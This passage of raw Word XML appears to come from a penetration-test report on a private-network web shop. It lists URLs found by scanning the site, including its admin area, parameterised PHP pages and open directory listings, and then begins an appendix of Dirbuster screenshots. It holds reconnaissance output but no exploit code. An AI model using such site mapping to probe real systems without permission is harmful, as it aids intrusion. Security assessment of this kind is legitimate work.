    <w:p w14:paraId="2A99EC71"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http://192.168.1.10/images/s2.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E1086F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http://192.168.1.10/images/s3.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B176CE2"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http://192.168.1.10/images/s3.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CB8CCFB"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http://192.168.1.10/images/s4.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789C7978"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http://192.168.1.10/images/s4.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25ECEAF4"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http://192.168.1.10/images/s5.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFE5DF2"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http://192.168.1.10/images/s5.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1566D573"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http://192.168.1.10/images/s6.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251749A9"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http://192.168.1.10/images/s6.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0971AAAB"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http://192.168.1.10/images/s7.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AD2687"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http://192.168.1.10/images/s7.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55AC030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http://192.168.1.10/images/s8.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FCF24B"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http://192.168.1.10/images/s8.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE7FD69"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http://192.168.1.10/images/s9.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF1A100"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http://192.168.1.10/images/s9.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BA6094"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http://192.168.1.10/images/samsung-galaxy-on5-sm-2s9.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5317F70A"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http://192.168.1.10/images/secondary_bar.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596D1C57"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http://192.168.1.10/images/shopcartone.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E50A0D"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lastRenderedPageBreak/>
        <w:t>http://192.168.1.10/images/shopcarttwo.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72BF6365"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http://192.168.1.10/images/slide-img1.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33550F41"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http://192.168.1.10/images/slide-img2.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61370A4D"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http://192.168.1.10/images/slide-img3.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17931613"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http://192.168.1.10/images/slide-price.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C2922D"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http://192.168.1.10/images/slider-bg.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436E6F7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http://192.168.1.10/images/slider-left.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB6D4A9"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http://192.168.1.10/images/slider-nav.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4709580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http://192.168.1.10/images/slider-right.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C83998D"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http://192.168.1.10/images/social-icon1.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA6A437"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http://192.168.1.10/images/social-icon2.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F6C4B2"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http://192.168.1.10/images/social-icon3.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E4BE1A"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http://192.168.1.10/images/social-icon4.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195DB255"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http://192.168.1.10/images/social-icon5.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8F13E9"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http://192.168.1.10/images/social-icon6.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFBB1DB"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http://192.168.1.10/images/social-icon7.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE2DABA"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http://192.168.1.10/images/suncart.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EDE5F1"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http://192.168.1.10/images/table_sorter_header.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499B1642"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http://192.168.1.10/images/th.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB1B54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http://192.168.1.10/images/wrist-watch.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0584FDDA"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http://192.168.1.10/images/xogmo.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0B547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http://192.168.1.10/images/zaad.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB4ED0A"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http://192.168.1.10/index.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF68A39"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http://192.168.1.10/insertCustomer.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2194A2"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http://192.168.1.10/js/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064FE239"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http://192.168.1.10/js/?C=S;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A6503E"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http://192.168.1.10/js/DD_belatedPNG-min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24612275"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http://192.168.1.10/js/Myriad_Pro_700.font.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D73A45E"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http://192.168.1.10/js/bootstrap.min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18757707"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http://192.168.1.10/js/countries.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6408F4"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http://192.168.1.10/js/cufon-yui.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B8686F"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http://192.168.1.10/js/functions.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8B4477"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http://192.168.1.10/js/jquery-1.10.2.min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCE506A"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http://192.168.1.10/js/jquery-1.10.2.min.map</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EFBB69"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http://192.168.1.10/js/jquery-1.6.2.min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF5A13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http://192.168.1.10/js/jquery.jcarousel.min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6937387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http://192.168.1.10/js/jquery.min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067DF384"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http://192.168.1.10/js/main.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F3D0F7"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http://192.168.1.10/js/moment+langs.min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA46E8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http://192.168.1.10/js/sliding.form.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B31AA08"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http://192.168.1.10/login.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B54BF15"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http://192.168.1.10/logout.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D33821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http://192.168.1.10/pictures/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1270C4"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http://192.168.1.10/pictures/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7CE2E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lastRenderedPageBreak/>
        <w:t>http://192.168.1.10/pictures/Hello%20World.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14196747"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http://192.168.1.10/pictures/bg.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9BBA7A"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http://192.168.1.10/pictures/fluffy.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4DB030"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http://192.168.1.10/pictures/phonepicutres-TA.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216D016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http://192.168.1.10/pictures/rick.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDC59D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http://192.168.1.10/products.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39702DA8"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http://192.168.1.10/products.php?command&amp;productid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F944CB1"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http://192.168.1.10/profile.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174EE0CB"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http://192.168.1.10/profile.php?msg=Successfully%20updated%20-%20I%20think!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481291F4"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http://192.168.1.10/robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B761F0D"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http://192.168.1.10/sitemap.xml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D91EE4B"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http://192.168.1.10/thankyou.php?id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726F9267"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http://192.168.1.10/updatepassword.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D506D7B"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http://192.168.1.10/userValidate.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5184EF75"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http://192.168.1.10/view_cart.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73E34B4B"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http://192.168.1.10/warehouse_1.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CC7CBF"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http://192.168.1.10/warehouse_1.php?command&amp;productid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDA9902"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http://192.168.1.10/warehouse_2.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792CB1A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http://192.168.1.10/warehouse_2.php?command&amp;productid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A90C6B" w14:textId="77777777" w:rsidR="00131110" w:rsidRPr="00D334C2" w:rsidRDefault="00131110" w:rsidP="00131110">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A4E454D"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 xml:space="preserve">--- Admin </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Urls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C59268" w14:textId="77777777" w:rsidR="00131110" w:rsidRPr="00D334C2" w:rsidRDefault="00131110" w:rsidP="00131110">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="518E8E26" w14:textId="77777777" w:rsidR="00131110" w:rsidRPr="00D334C2" w:rsidRDefault="00131110" w:rsidP="00131110">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64F036FF"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7AC3C1"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http://192.168.1.10/admin/css/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B4AB43"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http://192.168.1.10/admin/css/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1B15C4"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http://192.168.1.10/admin/css/bootstrap.min.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061EAD64"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http://192.168.1.10/admin/css/chatStyle.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EE76BF"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http://192.168.1.10/admin/css/layout.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144E57AE"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C865CF8"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http://192.168.1.10/admin/images/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A956C1"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http://192.168.1.10/admin/images/breadcrumb_divider.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="207220F4"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http://192.168.1.10/admin/images/btn_submit.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5566E743"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http://192.168.1.10/admin/images/btn_submit_2.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C2DF23"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http://192.168.1.10/admin/images/btn_view_site.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F72DD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http://192.168.1.10/admin/images/employee.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA648B3"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http://192.168.1.10/admin/images/favicon.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383FF2B0"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http://192.168.1.10/admin/images/header_bg.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="084E26DA"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http://192.168.1.10/admin/images/header_shadow.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393535AA"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http://192.168.1.10/admin/images/home.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495884A3"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http://192.168.1.10/admin/images/icn_add_user.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E53EC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http://192.168.1.10/admin/images/icn_alert_error.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA7134A"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http://192.168.1.10/admin/images/icn_alert_inf.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609BEF6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http://192.168.1.10/admin/images/icn_alert_info.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="593BFD1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lastRenderedPageBreak/>
        <w:t>http://192.168.1.10/admin/images/icn_alert_success.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D691772"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http://192.168.1.10/admin/images/icn_alert_warning.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B5642D"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http://192.168.1.10/admin/images/icn_audio.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D1049E"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http://192.168.1.10/admin/images/icn_categories.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DAAD50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http://192.168.1.10/admin/images/icn_edit.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DBB26C9"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http://192.168.1.10/admin/images/icn_edit_article.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCBE487"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http://192.168.1.10/admin/images/icn_folder.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0B0461"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http://192.168.1.10/admin/images/icn_jump_back.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB3E87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http://192.168.1.10/admin/images/icn_logout.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E9CE03"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http://192.168.1.10/admin/images/icn_new_article.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69910614"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http://192.168.1.10/admin/images/icn_photo.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA327EB"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http://192.168.1.10/admin/images/icn_profile.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3F6FD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http://192.168.1.10/admin/images/icn_search.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B23C2F"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http://192.168.1.10/admin/images/icn_security.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61BBAFF0"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http://192.168.1.10/admin/images/icn_settings.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7859745C"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http://192.168.1.10/admin/images/icn_tags.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD1D60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http://192.168.1.10/admin/images/icn_trash.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0C6D88"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http://192.168.1.10/admin/images/icn_user.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD2F3F1"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http://192.168.1.10/admin/images/icn_video.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E53001"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http://192.168.1.10/admin/images/icn_view_users.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586F6CD4"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http://192.168.1.10/admin/images/list-item.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45AEF262"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http://192.168.1.10/admin/images/logo.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63956C9F"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http://192.168.1.10/admin/images/module_footer_bg.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7674F37D"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http://192.168.1.10/admin/images/post_message.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FADF98B"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http://192.168.1.10/admin/images/search-bg.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504B4281"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http://192.168.1.10/admin/images/search-button.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72433630"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http://192.168.1.10/admin/images/secondary_bar.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1782BBC9"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http://192.168.1.10/admin/images/secondary_bar_shadow.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6ADAAD"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http://192.168.1.10/admin/images/sidebar.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5753CB5B"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http://192.168.1.10/admin/images/sidebar_divider.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44AD37DA"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http://192.168.1.10/admin/images/sidebar_shadow.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44447F3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http://192.168.1.10/admin/images/table_sorter_header.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D10C5E"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http://192.168.1.10/admin/index.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D42C24"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http://192.168.1.10/admin/js/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAE518B"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http://192.168.1.10/admin/js/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007B3411"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http://192.168.1.10/admin/js/hideshow.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11891951"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http://192.168.1.10/admin/js/jquery-1.5.2.min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539CE130"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http://192.168.1.10/admin/js/jquery.equalHeight.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4477CC96"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http://192.168.1.10/admin/js/jquery.tablesorter.min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F06611"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http://192.168.1.10/admin/shout.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B887045"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http://192.168.1.10/images/close_btn.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C47D597" w14:textId="77777777" w:rsidR="00131110" w:rsidRPr="00D334C2" w:rsidRDefault="00131110" w:rsidP="00131110">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>http://192.168.1.10/js/jquery-1.9.0.min.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD9E97B" w14:textId="77777777" w:rsidR="009A241B" w:rsidRPr="00D334C2" w:rsidRDefault="00131110" w:rsidP="00131110">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D334C2">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>http://chart.apis.google.com/chart?chxr=0,0,3000&amp;chxt=y&amp;chs=520x140&amp;cht=lc&amp;chco=76A4FB,80C65A&amp;chd=s:Tdjpsvyvttmiihgmnrst,OTbdcfhhggcTUTTUadfk&amp;chls=2%7C2&amp;chma=40,20,20,30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DEF58B" w14:textId="349889F7" w:rsidR="009525A9" w:rsidRPr="008831CC" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:szCs w:val="30"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="58" w:name="_Toc531104378"/>
      <w:r w:rsidRPr="008831CC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:szCs w:val="30"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Appendix B</w:t>
      </w:r>
      <w:r w:rsidR="003023A3" w:rsidRPr="008831CC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:szCs w:val="30"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidR="003B457E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:szCs w:val="30"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008831CC" w:rsidRPr="008831CC">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:szCs w:val="30"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Dirbuster</w:t>
      </w:r>
      <w:bookmarkEnd w:id="58"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="187E9184" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC"/>
    <w:p w14:paraId="4AA13B63" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="13F6E27D" wp14:editId="015B9301">
            <wp:extent cx="5943600" cy="20707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070735"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="267014EA" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31234CAE" wp14:editId="32417559">
            <wp:extent cx="5943600" cy="20504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050415"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DF2794" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="143F96E9" wp14:editId="668D33FC">
            <wp:extent cx="5943600" cy="2028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028825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFE390C" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="521029BE" wp14:editId="511E426D">
            <wp:extent cx="5943600" cy="19919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991995"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DF6ADD" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="10E738BA" wp14:editId="1177E4FB">
            <wp:extent cx="5943600" cy="19996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999615"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="44134A2C" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3F982782" wp14:editId="4B307427">
            <wp:extent cx="5943600" cy="1983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983740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="33114211" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1CE4D26A" wp14:editId="1168E29C">
            <wp:extent cx="5943600" cy="2020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020570"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="382055FA" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7FCA33B0" wp14:editId="0B2DEFE9">
            <wp:extent cx="5943600" cy="2047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047240"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8F1C74" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C59729E" wp14:editId="0E8F015A">
            <wp:extent cx="5943600" cy="20370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037080"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4376AA" w14:textId="77777777" w:rsidR="008831CC" w:rsidRDefault="008831CC" w:rsidP="008831CC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F33872E" wp14:editId="16D5AD01">
            <wp:extent cx="5943600" cy="20046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004695"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
